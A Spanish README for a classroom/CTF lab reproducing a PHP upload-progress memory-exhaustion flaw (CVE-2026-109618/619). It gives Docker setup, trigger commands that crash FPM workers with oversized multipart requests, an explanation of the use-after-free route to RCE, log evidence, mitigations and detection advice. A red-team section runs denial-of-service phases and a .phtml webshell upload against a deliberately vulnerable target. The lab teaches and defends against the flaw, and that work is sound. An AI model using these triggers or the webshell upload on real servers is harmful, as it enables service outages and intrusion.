# Laboratorio PHP2Shell (CVE-2026-109618 / CVE-2026-109619)

Reproductor **local, aislado y no armado** del fallo que se alcanza al agotar
`memory_limit` dentro del handler de `session.upload_progress`, durante el
parseo multipart y **antes** de que se ejecute el script de la aplicación.

> **Alcance.** Este laboratorio comprueba el *mecanismo de fallo* (OOM +
> terminación del worker + evidencias en logs). No incluye heap grooming,
> estructuras falsas, direcciones de memoria ni llamadas a `system()`; por
> tanto **no es un exploit de RCE**. No lo expongas fuera de `127.0.0.1`.
>
> **Aviso.** Las versiones afectadas son PHP < 8.2.35, < 8.3.36, < 8.4.27 y
> < 8.5.12. La única mitigación completa es actualizar. Lo de aquí es para
> un entorno de clase/CTF aislado.

---

## 1. Qué hay montado

```
.
├── docker-compose.yml          # PHP 8.5.11 (vulnerable) + nginx, red dedicada
├── docker-compose.fixed.yml    # PHP 8.5.12 (parcheado), puerto 8081
├── php/php.ini                 # memory_limit=4M, upload_progress On
├── php/www.conf                # 1 worker, logs de hijos a stderr
├── nginx/default.conf          # fastcgi_pass a php:9000
├── www/index.php               # script trivial: el fallo ocurre antes de él
├── trigger.py                  # genera el multipart (3 modos)
└── collect-evidence.sh         # recoge logs, sesiones, dmesg, coredumps
```

Aislamiento aplicado:

- nginx solo publica `127.0.0.1:8080` (y el fijo `127.0.0.1:8081`).
- Red bridge propia por proyecto; PHP no publica el 9000.
- `read_only: true` + `tmpfs` acotados para `/tmp` y `/var/run`.
- `cap_drop: ALL` y solo las capabilities mínimas para FPM/nginx.
- `no-new-privileges`, `mem_limit` y `pids_limit`.

## 2. Iniciarlo

```bash
cd /home/kali/php2shell-poc-lab

# Vulnerable (PHP 8.5.11)
docker compose up -d
docker compose ps
curl -sS http://127.0.0.1:8080/          # ok pid=... limit=4M

# Opcional: parcheado (PHP 8.5.12) en paralelo, puerto 8081
docker compose -f docker-compose.fixed.yml up -d
```

Verificación rápida de configuración:

```bash
docker compose exec -T php php -v
docker compose exec -T php php -i | grep -E \
  'session.upload_progress|memory_limit|max_file_uploads|max_multipart_body_parts'
```

## 3. Disparar el fallo

```bash
# Modo A: valor enorme de PHP_SESSION_UPLOAD_PROGRESS (1 MiB).
# Es el caso más pequeño y el que reproduce el OOM dentro del handler.
python3 trigger.py --url http://127.0.0.1:8080/ --mode progress

# Modo B: muchas partes pequeñas; la sesión se re-codifica en cada tick.
python3 trigger.py --url http://127.0.0.1:8080/ --mode parts --parts 4000

# Modo C: pocas partes con nombres de campo/archivo de 1 KiB.
python3 trigger.py --url http://127.0.0.1:8080/ --mode names \
  --parts 1000 --name-len 1024
```

Contra el parcheado:

```bash
python3 trigger.py --url http://127.0.0.1:8081/ --mode progress
```

### Resultado observado con 8.5.11 (modo `progress`)

```
[i] destino=http://127.0.0.1:8080/ modo=progress body=1049049 bytes ...
[1/1] HTTP 502 Bad Gateway (0.02s) ...
```

```
NOTICE: PHP message: PHP Fatal error:  Allowed memory size of 4194304 bytes
exhausted (tried to allocate 1052672 bytes) in Unknown on line 0
Stack trace:
#0 {main}
WARNING: [pool www] child 7 exited with code 70 after 25.09 seconds from start
NOTICE: [pool www] child 8 started
```

```
[error] ... upstream sent unexpected FastCGI record: 3 while reading
response header from upstream ...
"POST / HTTP/1.1" 502 157
```

Fíjate en `in Unknown on line 0`: el fatal ocurre en el *request startup*, no
en `index.php`. El hijo termina y el maestro lo reemplaza. No hay OOM del
kernel.

### Evidencia de que el handler procesó el progreso

Con una petición que **no** llega a agotar memoria:

```bash
python3 trigger.py --url http://127.0.0.1:8080/ --mode parts --parts 50
docker compose exec -T php sh -c \
  'ls -l /tmp/sess_*; head -c 260 /tmp/sess_*'
```

Se observa un archivo `sess_<sid>` con una clave como
`upload_progress_k|a:5:{...s:5:"files";a:...}`. Eso demuestra que el handler
abrió la sesión, insertó el array de progreso y la re-serializó **sin que la
aplicación llamara a `session_start()`**.

### cURL mínimo (mecanismo, sin OOM)

```bash
curl -sS -i http://127.0.0.1:8080/ \
  -F 'PHPSESSID=abcdef0123456789abcdef0123456789' \
  -F 'PHP_SESSION_UPLOAD_PROGRESS=lab' \
  -F 'file=@/etc/hostname'
```

`-F` escala mal para cuerpos de MiB o miles de partes; por eso el reproductor
construye el multipart en Python. Un `curl` equivalente para el modo `parts`
sería un bucle de `-F 'uN=@fN.txt'`, pero genera menos control sobre el orden
y el tamaño exactos.

## 4. Qué ocurre paso a paso

### 4.1 Nivel HTTP / proceso

1. nginx acepta el `POST` y lo reenvía por FastCGI a `php:9000`. Si el cuerpo
   supera el buffer, nginx lo vuelca a `/var/cache/nginx/client_temp`.
2. El maestro de FPM entrega la conexión a un worker libre. El worker lee los
   parámetros FastCGI y el cuerpo.
3. Antes de compilar/ejecutar el script, PHP hace el *request startup*:
   `php_request_startup()` → parseo automático del cuerpo → `main/rfc1867.c`.
4. Al ver el campo `PHPSESSID` y `PHP_SESSION_UPLOAD_PROGRESS` (nombre
   configurable en `session.upload_progress.name`), el parser invoca al
   handler de progreso. **No hace falta que la app use sesiones.**
5. Por cada evento/tick el handler:
   - abre la sesión desde `session.save_path`;
   - la deserializa;
   - inserta/actualiza `$_SESSION[<prefix><valor>]` con `start_time`,
     `content_length`, `bytes_processed`, `done` y un array `files` con una
     entrada por parte (nombre de campo, nombre de archivo, `tmp_name`,
     `error`, bytes...);
   - vuelve a serializar **toda** la sesión y la escribe.
6. El coste lo controla el atacante: número de partes, longitud de nombres,
   valor de progreso y número de cabeceras por parte. La re-serialización por
   tick da un crecimiento aproximadamente cuadrático con muchas partes.

### 4.2 Memoria del proceso (Zend MM, no el kernel)

- PHP no usa `malloc` para todo: el *Zend Memory Manager* pide bloques
  grandes al SO con `mmap` (chunks de ~2 MiB) y sirve asignaciones pequeñas
  desde *bins*. `memory_limit` se contrapone contra los bytes **gestionados**
  por Zend MM, no contra el RSS ni contra la memoria virtual total.
- Mientras el handler construye el array de progreso y serializa, hace
  `emalloc`/`erealloc` de claves, valores, buckets de hash y buffers.
- Cuando una asignación supera `memory_limit`, en las versiones afectadas se
  llama a `zend_mm_safe_error()` → `zend_bailout()` → `longjmp()`. Ese salto
  **no retorna** al punto de llamada: se abandona la operación a medias.
- El *request shutdown* sigue ejecutándose y destruye las estructuras. Si la
  inserción en la hash table ya había incrementado `nNumUsed`/`nNumOfElements`
  pero aún no había inicializado el bucket (la clave se asigna después), el
  destructor recorre un bucket no inicializado y lo interpreta como `zval`.
  Eso es el use-after-free / estado inválido de **CVE-2026-109618**, y es lo
  que puede convertirse en RCE con heap grooming (no incluido aquí).
- **CVE-2026-109619** es el otro lado: estado global del worker (sesión,
  error, decodificadores) que apunta a memoria del request anterior y se lee
  antes de reinicializarse en el siguiente request. En FPM se confirma RCE
  cuando la aplicación realiza después una operación adecuada.

Matiz importante para el laboratorio: el aviso de PHP indica que, si el
*request startup* falla, **FPM termina el hijo** y el maestro lo reemplaza;
por eso no se consume el estado inválido como en `mod_php` (donde el shutdown
sí se ejecuta incondicionalmente). En FPM el síntoma observable es
*caída/reemplazo de worker* y `502`; el RCE completo de 618 está demostrado
en `mod_php`, no en FPM.

### 4.3 OOM de PHP vs. OOM del kernel

Son dos eventos distintos y conviene no mezclarlos:

| | OOM de PHP (`memory_limit`) | OOM del kernel/cgroup |
|---|---|---|
| Quién lo dispara | Zend MM al superar `memory_limit` | el SO al no poder satisfacer páginas |
| Log típico | `PHP Fatal error: Allowed memory size ... exhausted` | `Out of memory: Killed process ... (php-fpm)` |
| Señal | fatal + `zend_bailout`; FPM sale con código 70 | `SIGKILL` (9) |
| `dmesg` | **no aparece nada** | aparece `oom-kill` |
| Cuándo ocurre | configuración normal con `memory_limit` finito | `memory_limit=-1`, cgroup/host sin RAM |

En este laboratorio estamos en el primer caso: por eso `dmesg` está limpio.
La memoria virtual puede ser grande (chunks mmap de Zend) sin que el RSS lo
sea; el límite de PHP es contable, no residente.

## 5. Validar el colapso con logs

```bash
# 1) PHP-FPM: fatal durante startup + salida/reemplazo del hijo
docker compose logs --since=10m php

# 2) nginx: 502 y "unexpected FastCGI record"
docker compose logs --since=10m nginx

# 3) Archivos de sesión que dejó el handler (cleanup=Off en el lab)
docker compose exec -T php sh -c \
  'ls -l /tmp/sess_*; for f in /tmp/sess_*; do echo "--- $f"; head -c 300 "$f"; done'

# 4) Evidencia agregada + OOM del kernel + coredumps
./collect-evidence.sh
```

Qué buscar:

- `PHP Fatal error: Allowed memory size of N bytes exhausted ... in Unknown on line 0`
  → el fallo es en inicialización, antes del script.
- `WARNING: [pool www] child N exited with code 70` seguido de
  `NOTICE: [pool www] child M started` → el worker murió y fue reemplazado.
- `upstream prematurely closed connection` / `unexpected FastCGI record` /
  `502` en nginx → el cliente ve el corte.
- `child ... exited on signal 11 (SIGSEGV)` → corrupción de memoria que
  provocó segfault (más grave que el simple OOM controlado).
- En `mod_php`, en su lugar: `AH00052: child pid ... exit signal Segmentation fault (11)`.
- `dmesg`/`journalctl -k` **solo** si hay OOM del kernel:
  `Out of memory: Killed process ... (php-fpm)` con `total-vm` y `anon-rss`.
- `coredumpctl list` si hay core dumps del worker.

## 6. Comparación con 8.5.12

`docker-compose.fixed.yml` levanta el parcheado en `127.0.0.1:8081`. Con el
mismo trigger de 1 MiB sigue apareciendo un fatal y FPM sigue reemplazando al
hijo (el límite duro se alcanza igual); lo que cambia es el manejo interno:
el OOM se difiere a un punto seguro y no se ejecuta cleanup sobre estado
inválido. La diferencia **no** se ve con un simple `200 vs 502`; la validación
fuerte es ejecutar la suite de regresión `oom_*` de php-src contra ambos
binarios (el equipo de OX reporta 7 fallos en 8.2.34 y 0 en 8.2.35).

## 7. Mitigación y detección (defensivo)

1. **Actualizar** a 8.2.35 / 8.3.36 / 8.4.27 / 8.5.12 o al paquete del
   proveedor, y reiniciar todos los workers (incluidas imágenes de contenedor).
2. Mientras no se pueda parchear:
   - `session.upload_progress.enabled=0` y, en PHP 8.5,
     `fatal_error_backtraces=0` (mitiga 619, no 618);
   - `memory_limit=-1` **administrado** + límites de cuerpo/RAM en el
     frontend y en el contenedor (según el aviso de PHP). No usar
     `RLIMIT_AS`/`RLIMIT_DATA`: pueden provocar el propio `longjmp` vulnerable;
   - limitar cuerpo decodificado, nº de partes, cabeceras por parte,
     `max_input_vars`, `max_multipart_body_parts`, `max_file_uploads` y
     longitud de nombres en nginx/WAF. Ojo: muchas reglas solo inspeccionan
     la primera línea o truncan el cuerpo; hay que mirar el cuerpo completo y
     aceptar bytes de control.
3. Detección: correlacionar POST grandes/anómalos, `Fatal ... in Unknown on
   line 0`, muertes de hijos FPM, `502` y, sobre todo, procesos shell hijos de
   `php-fpm`/`www-data` (indicador directo de RCE).

## 8. Red team lab: de OOM a RCE

La versión operativa tipo engagement está en [`lab/`](lab/README.md). Tiene dos
actos y un objetivo final con flag:

1. **CVE-2026-109618/619:** recon → validación → DoS → evidencia.
2. **RCE:** subida de webshell `.phtml` en una app PHP **vulnerable por diseño**
   (`target/`, puerto `8082`) y lectura de `/flag.txt`.

```bash
# Engagement completo (CVE + RCE + captura de flag)
./lab/run-lab.sh

# Fase por fase
python3 lab/rt.py recon    --url http://127.0.0.1:8080/
python3 lab/rt.py validate --url http://127.0.0.1:8080/ --docker-inspect
python3 lab/rt.py impact   --url http://127.0.0.1:8080/ --repeat 3
python3 lab/rce.py         --url http://127.0.0.1:8082/
python3 lab/rt.py capture
```

Artefactos: `lab/reports/scoreboard.md`, `lab/reports/FLAG.txt`, informes
`engagement-*.md` y `rce-*.md`, logs FPM/nginx y reglas Sigma/Suricata en
`lab/detections/`.

Variante mod_php real (el SAPI donde se documenta el RCE de 618):

```bash
./lab/run-modphp.sh      # PHP 8.5.11 + Apache en 127.0.0.1:8083
```

> El RCE se logra contra el target de entrenamiento, no explotando la
> corrupción de memoria del CVE. El acto 1 mide **DoS + escritura de sesión**
> y la variante mod_php reproduce el **fatal real** en `Unknown on line 0`;
> no incluye heap grooming. Solo se aceptan objetivos loopback.

### Actividad de sistemas operativos

El acto 1 tiene una actividad guiada para estudiar **memoria, procesos y
sistemas de archivos** con evidencia real (`/proc`, cgroup v2, `strace`,
`pidstat`, montajes, inodos y logs):

```bash
./lab/os-activity/run-activity.sh --start
```

- Guía: [`lab/os-activity/README.md`](lab/os-activity/README.md)
- Entregable único: [`lab/os-activity/entrega/informe-php2shell.pdf`](lab/os-activity/entrega/informe-php2shell.pdf)
- Cómo regenerar el PDF: [`lab/os-activity/entrega/LEEME.md`](lab/os-activity/entrega/LEEME.md)
- Borrador opcional (no se entrega): [`lab/os-activity/worksheet.md`](lab/os-activity/worksheet.md)

Reproduce el OOM del acto 1 y explica por qué es un fallo de **memoria de
usuario** (Zend MM) y no un OOM del kernel, cómo FPM repone el worker y qué
papel juega el `tmpfs` de `/tmp`. El estudiante entrega un solo PDF con todo
el proceso y las capturas de la evidencia.

## 9. Parar y limpiar

```bash
docker compose down -v
docker compose -f docker-compose.fixed.yml down -v
docker compose -f docker-compose.modphp.yml down -v
rm -f /tmp/sess_* 2>/dev/null || true
```

Los archivos de sesión del laboratorio viven en el `tmpfs` del contenedor, así
que desaparecen al detenerlo; el `rm` es solo por si se copiaron fuera.
